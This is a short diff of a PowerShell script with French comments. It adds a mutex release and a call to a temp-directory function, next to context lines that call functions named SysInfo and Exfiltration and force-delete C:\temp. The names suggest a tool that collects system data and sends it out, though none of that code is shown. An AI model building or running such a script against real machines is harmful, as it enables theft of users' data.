@@ -115,7 +115,6 @@ function SysInfo {
 # Ajoute une variable de synchronisation
 $SyncLock = [System.Threading.Mutex]::new($false, 'SyncLock')
 
-
 # Function to delete the temporary directory
 function DelTempDir {
     Set-Location -Path "C:\"
@@ -124,9 +123,13 @@ function DelTempDir {
     if (Test-Path -Path "C:\temp" -PathType Container) {
         Remove-Item -Path "C:\temp" -Force -Recurse
     }
-    #exit
+
+    # Libère la variable de synchronisation pour permettre à DelTempDir de s'exécuter
+    $SyncLock.ReleaseMutex()
 }
 
+#Call TempDir
+TempDir
 
 # Call Exfiltration
 Exfiltration
